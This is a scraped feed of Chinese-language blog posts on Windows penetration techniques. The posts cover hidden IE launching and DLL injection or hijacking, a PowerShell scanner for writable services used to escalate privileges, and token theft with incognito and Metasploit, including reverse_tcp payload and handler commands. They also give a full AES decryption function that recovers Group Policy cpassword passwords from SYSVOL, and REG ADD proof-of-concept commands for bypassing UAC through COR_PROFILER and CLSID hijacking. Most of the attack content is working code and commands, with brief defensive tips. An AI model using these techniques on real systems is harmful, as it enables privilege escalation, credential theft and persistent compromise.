由于计划任务的权限为system，所以用户桌面无法查看启动的IE浏览器界面，缓存位置也不同，通用路径为%windir%\System32\config\systemprofile\AppData\Local\Microsoft\Windows\可使用通配符获得不同系统下缓存文件的路径，命令如下： dir %windir%\*evil-kiwi*.png /s /b 所以使用计划任务打开的IE浏览器，不存在历史记录，父进程为svchost.exe 第四种思路： 创建服务启动IE，访问网址，通过缓存获得下载的文件 sc create Test1 type= own binpath= &quot;C:\Program Files\Internet Explorer\iexplore.exe&quot; sc start test1 通过这种方式启动的服务，调用的程序需要能够同SCM(Services Control Manager)进行交互，而iexplorer.exe不支持这个功能 可通过其他方式创建服务 注： 隐蔽启动IE，访问特定网址，通过缓存获得下载的文件后，需要手动结束IE进程 e) 隐蔽启动ie，进行DLL注入(APC、Atombombing) 隐蔽启动IE后，对IE进程进行dll注入，dll实现文件下载的功能 APC注入的代码可参考： https://github.com/3gstudent/Inject-dll-by-APC Atombombing可以理解为APC注入的升级版，可参考文章： 《AtomBombing利用分析》 (2) 后台有IE进程a) DLL注入(APC、Atombombing) 方法同上，不再赘述 2、被动模式a) DLL劫持 这里仅给出一个实例： C:\Program Files\Internet Explorer\IEShims.dll 该dll在IE浏览器打开时被加载 DLL开发思路： 可使用工具exportstoc，下载地址： https://github.com/michaellandi/exportstoc 生成方法可参考文章： https://3gstudent.github.io/3gstudent.github.io/Study-Notes-Weekly-No.1(Monitor-WMI_ExportsToC++_Use-DiskCleanup-bypass-UAC)/ 原dll保留，启动时需要做一个互斥，避免多次启动 b) BHO 利用BHO(Browser Helper Object)劫持IE浏览器，在浏览器页面打开时实现文件下载，可参考文章： 《利用BHO实现IE浏览器劫持》 0x03 小结 综上，模拟IE浏览器下载文件的实现方法如下： (1) 主动模式 当前后台无IE进程： 调用IE COM对象 Process Hollowing Process Doppelganging 隐蔽启动IE，访问特定网址，通过缓存获得下载的文件 通过cmd启动 通过服务启动 创建服务启动 隐蔽启动IE，进行DLL注入(APC、Atombombing) 当前后台有IE进程： DLL注入(APC、Atombombing) (2) 被动模式 DLL劫持 BHO 站在防御的角度，应对主动模式的利用方法，需要注意iexplore.exe的父进程是否可疑；应对DLL注入和DLL劫持，可监控敏感API的调用；应对BHO对象，可监控特定注册表 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Use powershell to find a writable windows service]]></title>
    <url>%2Fposts%2Feeef6ab6.html</url>
    <content type="text"><![CDATA[0x00 前言 从DidierStevens的博客学到了一些技巧，本文将要对其中涉及到的技巧进行测试总结，并开源一个powershell脚本，用来寻找可被替换的服务，实现自动化利用。 DidierStevens的博客链接： https://blog.didierstevens.com/2017/09/05/abusing-a-writable-windows-service/ 0x01 简介 本文将要介绍以下内容： 使用c#编写可供Windows服务调用的程序 psexec的-i参数使用技巧 sc命令使用技巧 通过powershell获取服务对应的可执行文件路径 自动化利用脚本开发细节 0x02 使用c#编写可供Windows服务调用的程序 可供Windows服务调用的程序需要能够同SCM(Services Control Manager)进行交互，所以在程序编写上需要注意 Didier Stevens在博客中给出了c#开发的模板，代码如下： using System.ServiceProcess; namespace Demo { public class Service : ServiceBase { protected override void OnStart(string[] args) { System.Diagnostics.Process.Start(&quot;cmd.exe&quot;); } } static class Program { static void Main() { ServiceBase.Run(new ServiceBase[] { new Service() }); } } } 由于是c#代码，可以直接用csc.exe进行编译 所以在实际使用的过程，不需要提前编译好exe，只需要将cs脚本上传，再使用csc.exe编译成exe即可 0x03 sc命令使用技巧 查询所有服务列表： sc query 查询指定服务配置信息： sc qc 服务名 创建服务： sc create Test type= own binpath= c:\test\test.exe 删除服务： sc delete 服务名 0x04 通过powershell获取服务对应的可执行文件路径 Didier Stevens在博客中说他朋友找到了一个可写的Windows服务，并且只需要普通用户权限，于是，自然就想到了我们自己能否也找到这个服务 通过sc query能够列举出所有服务名称，再通过sc qc 服务名 查询到该服务对应的可执行文件路径 例如：sc qc eventlog 如下图，eventlog服务对应可执行文件路径为C:\Windows\System32\svchost.exe 可以手动去查找每个服务对应的可执行文件路径，看是否存在符合要求的路径（即普通用户可写的权限） 当然，该过程耗时耗力，最好通过编写程序来实现 在Windows系统下，最简单高效的开发语言还是powershell，于是决定使用powershell来实现自动化判断 但是，sc这个命令不能直接在ps里面运行，ps会把它当作set-content的别名 注： 可通过使用sc.exe在ps里面运行sc命令,例如sc.exe qc eventlog 解决方法： 调用WMI来实现，代码如下： Get-WmiObject win32_service | select Name,PathName 如下图，能够列举服务和对应的可执行文件路径 0x05 自动化利用脚本开发细节 下面介绍自动化脚本的开发细节，思路如下： 列举出服务和对应的可执行文件路径后，对每一个路径进行提取，判断该路径是否具有普通用户可写的权限 1、获取所有可执行文件路径Get-WmiObject win32_service | select Name,PathName 2、将可执行文件路径转换为数组$out = (Get-WmiObject win32_service | select PathName) $out|% {[array]$global:path += $_.PathName} 数组范围： $out[0]至$out[($out.Count-1)] 如下图 3、截取路径,显示单个数组的文件夹$out[0].PathName.Substring($out[0].PathName.IndexOfAny(&quot;C&quot;),$out[0].PathName.LastIndexOfAny(&quot;\&quot;)) 如下图 4、为了格式统一，将字符串都转换为大写$out[0].PathName.ToUpper().Substring($out[0].PathName.ToUpper().IndexOfAny(&quot;C&quot;),$out[0].PathName.ToUpper().LastIndexOfAny(&quot;\&quot;)) 5、枚举所有截取过的文件夹使用foreach循环： foreach ($item in $out) { $item.PathName.ToUpper().Substring($item.PathName.ToUpper().IndexOfAny(&quot;C&quot;),$item.PathName.ToUpper().LastIndexOfAny(&quot;\&quot;)) } 如下图 也可使用for循环： for($i=0;$i -le $out.Count-1;$i++) { $out[$i].PathName.ToUpper().Substring($out[$i].PathName.ToUpper().IndexOfAny(&quot;C&quot;),$out[$i].PathName.ToUpper().LastIndexOfAny(&quot;\&quot;)) } 6、获取文件夹权限$a=$out[$i].PathName.ToUpper().Substring($out[$i].PathName.ToUpper().IndexOfAny(&quot;C&quot;),$out[$i].PathName.ToUpper().LastIndexOfAny(&quot;\&quot;)) Get-Acl -Path $a |select Owner 以下三个权限代表管理员权限，不符合要求： NT AUTHORITY\SYSTEM NT SERVICE\TrustedInstaller BUILTIN\Administrators 因此要对其剔除,剩下的权限代表当前用户，对应代码为： If($a.Owner -ne &quot;NT AUTHORITY\SYSTEM&quot;){ If($a.Owner -ne &quot;NT SERVICE\TrustedInstaller&quot;){ If($a.Owner -ne &quot;BUILTIN\Administrators&quot;){ $a.Owner } } } 7、筛选符合条件的服务后，重新查找，找到当前用户权限对应的服务名称和路径Get-WmiObject win32_service | ?{$_.PathName -like $out[$i].PathName}|select Name,PathName 8、如果在系统未找到可利用的服务，脚本会报错，提示不能对 Null 值表达式调用方法如下图 使用$ErrorActionPreference=&quot;SilentlyContinue&quot;隐藏错误信息，错误信息写入$Error变量 综上，对输出格式进行优化，完整代码如下： $ErrorActionPreference=&quot;SilentlyContinue&quot; $out = (Get-WmiObject win32_service | select PathName) $out|% {[array]$global:path += $_.PathName} for($i=0;$i -le $out.Count-1;$i++) { $a=Get-Acl -Path $out[$i].PathName.ToUpper().Substring($out[$i].PathName.ToUpper().IndexOfAny(&quot;C&quot;),$out[$i].PathName.ToUpper().LastIndexOfAny(&quot;\&quot;)) If($a.Owner -ne &quot;NT AUTHORITY\SYSTEM&quot;){ If($a.Owner -ne &quot;NT SERVICE\TrustedInstaller&quot;){ If($a.Owner -ne &quot;BUILTIN\Administrators&quot;){ Get-WmiObject win32_service | ?{$_.PathName -like $out[$i].PathName}|select Name,PathName,ProcessId,StartMode,State,Status Write-host Owner: $a.Owner } } } } Write-host [+] All done. 0x06 实际测试 1、手动创建服务Testsc create Test type= own binpath= c:\test\test.exe 2、编译生成exeusing System.ServiceProcess; namespace Demo { public class Service : ServiceBase { protected override void OnStart(string[] args) { System.Diagnostics.Process.Start(&quot;calc.exe&quot;); } } static class Program { static void Main() { ServiceBase.Run(new ServiceBase[] { new Service() }); } } } 保存为test.cs 使用csc.exe编译： C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe test.cs 生成test.exe 3、启动服务sc start Test 查看进程，能够看到calc.exe进程启动，权限为system，如下图 4、替换test.exe在实际情况，如果没有获得管理员权限，那么无法启动和停止服务 如果不停止服务，就无法直接删除exe，提示拒绝访问 但可以将该文件重命名，相当于变相删除该文件，将新文件再命名为test.exe rename test.exe test2.exe 这样就可以在不停止服务的情况下实现文件替换，如下图 5、重启服务sc stop Test sc start Test 当然，该操作需要管理员权限 6、psexec的-i参数使用技巧由于服务启动的exe为system权限，默认为session 0，而用户界面为session 1，所以看不到启动的exe界面 可通过psexec指定启动exe的session，这样就能获取到程序界面 test.cs修改如下： using System.ServiceProcess; namespace Demo { public class Service : ServiceBase { protected override void OnStart(string[] args) { System.Diagnostics.Process.Start(@&quot;c:\test\psexec.exe&quot;, @&quot;-accepteula -d -i 1 calc.exe&quot;); } } static class Program { static void Main() { ServiceBase.Run(new ServiceBase[] { new Service() }); } } } 停止服务： sc stop Test 删除文件： del test.exe 编译文件： C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe test.cs 将psexec保存在c:\test 启动服务： sc start Test 此时，能够看到system权限calc.exe的界面，如下图 7、使用powershell脚本扫描如下图，标记出服务命令和可供替换的路径，便于进行替换 该脚本能够自动判断当前系统是否存在可供利用的服务 0x07 小结 如果找到了一个普通用户权限可写的Windows服务，对其可执行文件进行替换，那么在服务重启后，就能以system权限执行替换后的文件，可用作提权。 本文开源的脚本可用来自动查找当前系统是否存在普通用户权限可写的Windows服务，站在防御者的角度，也可以用该脚本测试自己的系统。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透技巧——Token窃取与利用]]></title>
    <url>%2Fposts%2Fb53be133.html</url>
    <content type="text"><![CDATA[0x00 前言 在之前的文章《渗透技巧——程序的降权启动》介绍了使用SelectMyParent降权的方法，本质上是通过token窃取实现的。这一次将要对token窃取和利用做进一步介绍，测试常用工具，分享利用技巧。 0x01 简介 本文将要介绍以下内容; Token简介 Metasploit中的incognito Windows平台下的incognito Invoke-TokenManipulation.ps1用法 利用token获得system权限 利用token获得TrustedInstaller权限 0x02 Token简介 Windows有两种类型的Token： Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录) Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹) 注： 两种token只在系统重启后清除 具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效 实际测试使用Test\a登录后注销，再使用administrator登录 查看token： incognito.exe list_tokens -u 能够获取到已注销用户Test\a的token，如下图 利用该token执行calc.exe: incognito.exe execute -c &quot;TEST\a&quot; calc.exe 后台显示进程calc.exe的用户名为a，如下图 0x03 Metasploit中的incognito 在Metasploit中，可使用incognito实现token窃取，常用命令如下： 加载incognito：load incognito 列举token：list_tokens -u 查看当前token：getuid 提示至system权限：getsystem token窃取：impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot; 从进程窃取：steal_token 1252 返回之前token：rev2self or drop_token 实际测试Client： msfpayload -p windows/meterpreter/reverse_tcp LHOST=192.168.81.142 LPORT=44444 X &gt;test.exe Server： use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set LPORT 44444 set LHOST 192.168.81.142 exploit 执行getsystem获得system权限 pid 1252的权限为当前用户，执行steal_token 1252， 将权限切换到WIN-R7MM90ERBMD\a 如下图 执行impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;将权限切换至system 注： 需要加引号和双斜杠，&quot;NT AUTHORITY\\SYSTEM&quot; 执行rev2self返回之前token，为WIN-R7MM90ERBMD\a 如下图 通过以上演示，成功通过token窃取实现权限切换 0x04 Windows平台下的incognito Metasploit中的incognito，是从windows平台下的incognito移植过来的，下面介绍一下windows平台下的incognito 下载地址： https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip 参考手册： http://labs.mwrinfosecurity.com/assets/142/mwri_security-implications-of-windows-access-tokens_2008-04-14.pdf 常见用法如下： 列举token：incognito.exe list_tokens -u 复制token：incognito.exe execute [options] &lt;token&gt; &lt;command&gt; 实际测试列举token： incognito.exe list_tokens -u 如下图 提权至system： incognito.exe execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe 如下图 降权至当前用户： incognito.exe execute -c &quot;WIN-R7MM90ERBMD\a&quot; cmd.exe 伪造用户： incognito.exe execute -c &quot;WIN-R7MM90ERBMD\b&quot; cmd.exe 如下图 0x05 Invoke-TokenManipulation.ps1用法 下载地址： https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1 原理和功能同incognito类似，能够实际提权和降权 列举token：Invoke-TokenManipulation -Enumerate 提权至system：Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; -Username &quot;nt authority\system&quot; 复制进程token：Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; -ProcessId 500 复制线程token：Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; -ThreadId 500 还有更多用法可参考该脚本说明 实际测试略 0x06 利用token获得TrustedInstaller权限 在Windows系统中，即使获得了管理员权限和system权限，也不能修改系统文件 因为Windows系统的最高权限为TrustedInstaller 例如路径C:\Windows\servicing 使用system权限无法在该路径创建文件 如下图 查看文件夹属性，显示system不具有写入权限，只有TrustedInstaller可以 如下图 关于如何获得TrustedInstaller权限，可参考James Forshaw的这篇文章，很值得学习 https://tyranidslair.blogspot.nl/2017/08/the-art-of-becoming-trustedinstaller.html 这里对其中的一个实例做测试，进而找到其他实现方法 启动TrustedInstaller服务会启动进程TrustedInstaller.exe，位置为C:\Windows\servicing\TrustedInstaller.exe，查看该程序权限： Get-Acl -Path C:\Windows\servicing\TrustedInstaller.exe |select Owner 显示为NT SERVICE\TrustedInstaller，如下图 James Forshaw的实现思路为借用TrustedInstaller.exe的token创建子进程，这样子进程就有了TrustedInstaller权限，具体powershell代码如下： Set-NtTokenPrivilege SeDebugPrivilege $p = Get-NtProcess -Name TrustedInstaller.exe $proc = New-Win32Process cmd.exe -CreationFlags NewConsole -ParentProcess $p powershell默认不支持Set-NtTokenPrivilege命令，该模块需要下载安装 下载地址： https://www.powershellgallery.com/packages/NtObjectManager/1.1.1 安装命令： Save-Module -Name NtObjectManager -Path c:\test Install-Module -Name NtObjectManager 注： Save-Module需要powershell v5.0支持，详情见： https://docs.microsoft.com/zh-cn/powershell/gallery/readme 因此测试系统选为Win10，默认powershell版本为5.0 导入该模块需要系统允许执行powershell脚本，因此先执行如下代码： Set-ExecutionPolicy Unrestricted 导入模块NtObjectManager： Import-Module NtObjectManager 执行命令测试： sc.exe start TrustedInstaller Set-NtTokenPrivilege SeDebugPrivilege $p = Get-NtProcess -Name TrustedInstaller.exe $proc = New-Win32Process cmd.exe -CreationFlags NewConsole -ParentProcess $p 使用whoami查看当前cmd权限： whoami /groups /fo list 发现当前cmd.exe在TrustedInstaller组里，成功获得TrustedInstaller权限 如下图 接着按照James Forshaw文章中更新的内容，学习了Vincent Yiu@vysecurity的方法，使用metasploit下的incognito也能够获得TrustedInstaller权限 地址如下： https://twitter.com/vysecurity/status/899303538630774787 思路如下： 启动服务TrustedInstaller 使用incognito获取TrustedInstaller.exe的token 获得TrustedInstaller权限 使用以下命令： load incognito getsytem ps steal_token 3204 getuid 按照这个思路，猜测使用SelectMyParent和Invoke-TokenManipulation.ps1也能获得TrustedInstaller权限 下面验证我们的判断 1、SelectMyParent sc start TrustedInstaller SelectMyParent.exe cmd.exe 1700 新的cmd.exe拥有TrustedInstaller权限 2、Invoke-TokenManipulation.ps1 添加如下代码即可： sc.exe start TrustedInstaller $id = Get-Process -name TrustedInstaller* | Select-Object id | ForEach-Object -Process{$_.id} Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; -ProcessId $id 注： sc这个命令不能直接在powershell里面运行，powershell会把它当作set-content的别名，可使用sc.exe在powershell里面运行sc命令 验证是否获得TrustedInstaller权限的方法1、对特殊路径写文件 例如C:\Windows\servicing，如下图 2、使用powershell Get-Acl -Path C:\Windows\servicing\TrustedInstaller.exe |select Owner 回显为NT SERVICE\TrustedInstaller 3、使用whoami whoami /groups | findstr TrustedInstaller 查看是否有回显 0x07 小结 本文介绍了token窃取的实现方法，使用多种工具来获得system权限和TrustedInstaller权限。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[域渗透——利用SYSVOL还原组策略中保存的密码]]></title>
    <url>%2Fposts%2F775f3b11.html</url>
    <content type="text"><![CDATA[0x00 前言 在之前的文章《域渗透——Local Administrator Password Solution》对LAPS的利用进行了分析。使用LAPS最大的优点是能够确保每台域内主机有不同的密码，并且定期更换。 那么，如果域内未配置LAPS，如何批量设置域内主机的本地管理员密码呢？这其中又存在哪些可被利用的地方呢？ 本文将要介绍如何利用SYSVOL还原组策略中保存的密码，分析技术细节，最后给出防御建议 0x01 简介 本文将要介绍以下内容： 域内共享文件夹\SYSVOL介绍 域管理员批量修改域内主机本地管理员密码的方法 组策略中可被利用的地方 实际测试 防御建议 0x02 域内共享文件夹\SYSVOL介绍 在域中，存在一个默认的共享路径： \\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\ 所有域内主机都能访问，里面保存组策略相关数据，包含登录脚本配置文件等 例如，测试主机所在域为test.local，可访问共享文件夹\\test.local\SYSVOL\test.local，如下图 0x03 域管理员批量修改域内主机本地管理员密码的方法 1、测试Server 2003系统对于server2003，想要批量修改域内主机本地管理员密码，常常通过配置组策略执行vbs脚本的方式 给出一个修改密码的vbs脚本(实现方式不唯一)，代码如下： strComputer = &quot;.&quot; Set objUser = GetObject(&quot;WinNT://&quot; &amp; strComputer &amp; &quot;/Administrator, user&quot;) objUser.SetPassword &quot;domain123!&quot; objUser.SetInfo 这种实现方式，最大的弊端在于修改后的密码会明文保存在vbs脚本中 而该vbs脚本通常会保存在共享文件夹\SYSVOL 这就存在一个隐患: 任何域用户都能读取该vbs脚本，也就能够获取脚本中保存的明文密码 2、测试Server 2008系统对于server 2008，添加了新功能，可使用Group Policy Preferences配置组策略批量修改用户本地管理员密码，具体方法如下： 开始-管理工具-组策略管理 选择域test.local，右键，选中在这个域中创建GPO并在此处链接，如下图 设置名称为test6 test6-设置-右键-编辑-用户配置-首选项-控制面板设置-本地用户和组,如下图 更新，administrator(内置),设置密码，如下图 委派，设置权限 在详细一栏，可看到该策略对应的ID为{E6424F10-C44B-4C45-8527-740189CBF60E} 如下图 至此，组策略配置完成，域内主机重新登录，即可应用此策略 在共享文件夹\SYSVOL中可看到组策略对应ID的文件夹，如下图 由于我们刚刚修改了用户配置下的控制面板，所以在对应的文件夹下能找到配置文件Groups.xml，具体路径如下： \\test.local\SYSVOL\test.local\Policies\{E6424F10-C44B-4C45-8527-740189CBF60E}\User\Preferences\Groups Groups.xml内容如下： &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt; - &lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt; - &lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;Administrator (内置)&quot; image=&quot;2&quot; changed=&quot;2017-09-25 22:57:53&quot; uid=&quot;{463245FF-08D3-4A28-95E7-42AB416DC508}&quot;&gt; &lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;9XLcz+Caj/kyldECku6lQ1QJX3fe9gnshWkkWlgAN1U&quot; changeLogon=&quot;0&quot; noChange=&quot;0&quot; neverExpires=&quot;0&quot; acctDisabled=&quot;0&quot; subAuthority=&quot;RID_ADMIN&quot; userName=&quot;Administrator (内置)&quot; /&gt; &lt;/User&gt; &lt;/Groups&gt; 如下图 值得注意的是其中的cpassword项，保存的是加密后的内容&quot;9XLcz+Caj/kyldECku6lQ1QJX3fe9gnshWkkWlgAN1U&quot; 加密方式为AES 256，虽然目前AES 256很难被攻破，但是微软选择公开了该AES 256加密的私钥，地址如下： https://msdn.microsoft.com/en-us/library/cc422924.aspx 借助该私钥，我们就能还原出明文 还原方式可采用Chris Campbell @obscuresec开源的powershell脚本，地址如下： https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1 该脚本可在域内主机上执行，能够自动查询共享文件夹\SYSVOL中的文件，还原出所有明文密码 测试如下图 当然，仅仅为了解密cpassword=&quot;9XLcz+Caj/kyldECku6lQ1QJX3fe9gnshWkkWlgAN1U&quot;，我们可以对以上powershell脚本的功能简化 简化代码如下： function Get-DecryptedCpassword { [CmdletBinding()] Param ( [string] $Cpassword ) try { #Append appropriate padding based on string length $Mod = ($Cpassword.length % 4) switch ($Mod) { &#39;1&#39; {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)} &#39;2&#39; {$Cpassword += (&#39;=&#39; * (4 - $Mod))} &#39;3&#39; {$Cpassword += (&#39;=&#39; * (4 - $Mod))} } $Base64Decoded = [Convert]::FromBase64String($Cpassword) #Create a new AES .NET Crypto Object $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8, 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b) #Set IV to all nulls to prevent dynamic generation of IV value $AesIV = New-Object Byte[]($AesObject.IV.Length) $AesObject.IV = $AesIV $AesObject.Key = $AesKey $DecryptorObject = $AesObject.CreateDecryptor() [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length) return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock) } catch {Write-Error $Error[0]} } Get-DecryptedCpassword &quot;9XLcz+Caj/kyldECku6lQ1QJX3fe9gnshWkkWlgAN1U&quot; 还原出明文密码为domain123!，如下图 0x04 组策略中可被利用的地方 组策略中可被利用的地方不只在修改管理员密码的位置，还包括以下： Services\Services.xml http://msdn.microsoft.com/en-us/library/cc980070(v=prot.13) ScheduledTasks\ScheduledTasks.xml http://msdn.microsoft.com/en-us/library/cc422920(v=prot.13) http://msdn.microsoft.com/en-us/library/dd341350(v=prot.13) http://msdn.microsoft.com/en-us/library/dd304114(v=prot.13) Printers\Printers.xml http://msdn.microsoft.com/en-us/library/cc422918(v=prot.13) Drives\Drives.xml http://msdn.microsoft.com/en-us/library/cc704598(v=prot.13) DataSources\DataSources.xml http://msdn.microsoft.com/en-us/library/cc422926(v=prot.13) 注： 位置引用自https://webcache.googleusercontent.com/search?q=cache:MUNO5X9hSwUJ:rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html+&amp;cd=6&amp;hl=en&amp;ct=clnk&amp;gl=us 但是以上位置并不绝对，在配置时需要在组策略中填入用户名密码，对应的Groups.xml才会包含cpassword属性，才能用于还原明文 可以拿计划任务来举例，对应ScheduledTasks.xml 组策略配置的位置为：用户配置-首选项-控制面板设置-计划任务 如下图 新建任务，需要选中运行身份，填入用户名和密码，如下图 否则，不包含cpassword属性，如下图 现在填入一个测试密码(密码为testsuccess!，假的)，如下图 对应ScheduledTasks.xml也会包含cpassword属性，如下图 使用powershell对其解密，还原出密码为testsuccess! 至此得出结论： 域管理员在使用组策略批量管理域内主机时，如果配置组策略的过程中需要填入密码，那么该密码会被保存到共享文件夹\SYSVOL下，默认所有域内用户可访问，虽然被加密，但很容易被解密 这就造成了安全隐患，现实中域管理员往往会在组策略中使用域管理员密码,组策略配置文件中的密码很容易被获得，导致权限提升 为此，微软发布了补丁KB2962486，下载地址： https://technet.microsoft.com/library/security/ms14-025 系统打了补丁后，组策略中无法设置用户名密码，如下图 当然，共享文件夹\SYSVOL下的xml文件也就不再包含cpassword属性 注： xml文件还是会和组策略保持同步 0x05 防御 结合攻击方法，可供选择的防御方法如下： 1、使用LAPS批量管理域内主机本地管理员帐户 2、域控安装补丁KB2962486 3、不在组策略中使用域控密码 4、设置共享文件夹\SYSVOL的访问权限 5、使用PsPasswd批量修改域内主机本地管理员密码 0x06 小结 本文介绍了如何利用SYSVOL还原组策略中保存的密码，给出了防御建议。如果域用户的本地管理员密码被攻击者获得，默认可被用于在域中远程登录。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Use CLR to bypass UAC]]></title>
    <url>%2Fposts%2F2650470b.html</url>
    <content type="text"><![CDATA[0x00 前言 在之前的文章《Use CLR to maintain persistence》介绍了通过CLR劫持.Net程序的后门，特点是无需管理员权限，并能够劫持所有.Net程序。那么，如果劫持了高权限的.Net程序，就能够绕过UAC，比如gpedit.msc 最近我在clem@clavoillotte的博客上也看到了相同的利用思路，并且，他的博客里有更多值得学习的地方。于是，我对他博客介绍的内容进行了整理，结合自己的经验，适当作补充，分享给大家。 clem@clavoillotte的博客地址： https://offsec.provadys.com/UAC-bypass-dotnet.html 0x01 简介 本文将要介绍以下内容： 使用CLR绕过UAC的方法 劫持系统CLSID绕过UAC的方法 0x02 使用CLR绕过UAC 我在《Use CLR to maintain persistence》一文中使用了wmic修改环境变量，代码如下： wmic ENVIRONMENT create name=&quot;COR_ENABLE_PROFILING&quot;,username=&quot;%username%&quot;,VariableValue=&quot;1&quot; wmic ENVIRONMENT create name=&quot;COR_PROFILER&quot;,username=&quot;%username%&quot;,VariableValue=&quot;{11111111-1111-1111-1111-111111111111}&quot; 在《Use Logon Scripts to maintain persistence》补充了使用powershell修改环境变量的方法，代码如下： New-ItemProperty &quot;HKCU:\Environment\&quot; COR_ENABLE_PROFILING -value &quot;1&quot; -propertyType string | Out-Null New-ItemProperty &quot;HKCU:\Environment\&quot; COR_PROFILER -value &quot;{11111111-1111-1111-1111-111111111111}&quot; -propertyType string | Out-Null clem@clavoillotte的方法是直接通过reg add，代码如下： REG ADD &quot;HKCU\Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32&quot; /ve /t REG_EXPAND_SZ /d &quot;C:\Temp\test.dll&quot; /f REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_PROFILER&quot; /t REG_SZ /d &quot;{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}&quot; /f clem@clavoillotte的POC: REG ADD &quot;HKCU\Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32&quot; /ve /t REG_EXPAND_SZ /d &quot;C:\Temp\test.dll&quot; /f REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_PROFILER&quot; /t REG_SZ /d &quot;{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}&quot; /f REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_ENABLE_PROFILING&quot; /t REG_SZ /d &quot;1&quot; /f REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_PROFILER_PATH&quot; /t REG_SZ /d &quot;C:\Temp\test.dll&quot; /f mmc gpedit.msc 个人认为不需要指定环境变量COR_PROFILER_PATH，经过精简后的POC如下： REG ADD &quot;HKCU\Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32&quot; /ve /t REG_EXPAND_SZ /d &quot;C:\test\calc.dll&quot; /f REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_PROFILER&quot; /t REG_SZ /d &quot;{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}&quot; /f REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_ENABLE_PROFILING&quot; /t REG_SZ /d &quot;1&quot; /f mmc gpedit.msc 测试dll依旧是通过c++编写的dll标准模板，下载地址： https://raw.githubusercontent.com/3gstudent/test/master/calc.dll 会正常启动gpedit.msc，同时弹出计算器，权限为high 如下图 如果想只启动计算器，不执行gpedit.msc，在启动代码WinExec(&quot;calc.exe&quot;,SW_SHOWNORMAL);后添加ExitProcess(0);就好 编译好的dll已上传，下载地址如下： https://raw.githubusercontent.com/3gstudent/test/master/calcexit.dll 测试如下图 计算器权限为high，成功绕过UAC 0x03 劫持系统CLSID绕过UAC的方法 clem@clavoillotte在博客中分享了如何劫持系统CLSID实现UAC绕过，所以接下来对其逐个测试，并标记需要注意的地方 1、{B29D466A-857D-35BA-8712-A758861BFEA1}注册表文件如下： Windows Registry Editor Version 5.00 [HKEY_CURRENT_USER\Software\Classes\CLSID\{B29D466A-857D-35BA-8712-A758861BFEA1}] @=&quot;Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager&quot; [HKEY_CURRENT_USER\Software\Classes\CLSID\{B29D466A-857D-35BA-8712-A758861BFEA1}\Implemented Categories] [HKEY_CURRENT_USER\Software\Classes\CLSID\{B29D466A-857D-35BA-8712-A758861BFEA1}\Implemented Categories\{62C8FE65-4EBB-45E7-B440-6E39B2CDBF29}] [HKEY_CURRENT_USER\Software\Classes\CLSID\{B29D466A-857D-35BA-8712-A758861BFEA1}\InprocServer32] @=&quot;C:\\Windows\\System32\\mscoree.dll&quot; &quot;Assembly&quot;=&quot;TestDotNet, Version=0.0.0.0, Culture=neutral&quot; &quot;Class&quot;=&quot;TestDotNet.Class1&quot; &quot;RuntimeVersion&quot;=&quot;v4.0.30319&quot; &quot;ThreadingModel&quot;=&quot;Both&quot; &quot;CodeBase&quot;=&quot;file://C://Temp//test_managed.dll&quot; [HKEY_CURRENT_USER\Software\Classes\CLSID\{B29D466A-857D-35BA-8712-A758861BFEA1}\InprocServer32\10.0.0.0] &quot;Assembly&quot;=&quot;TestDotNet, Version=0.0.0.0, Culture=neutral&quot; &quot;Class&quot;=&quot;TestDotNet.Class1&quot; 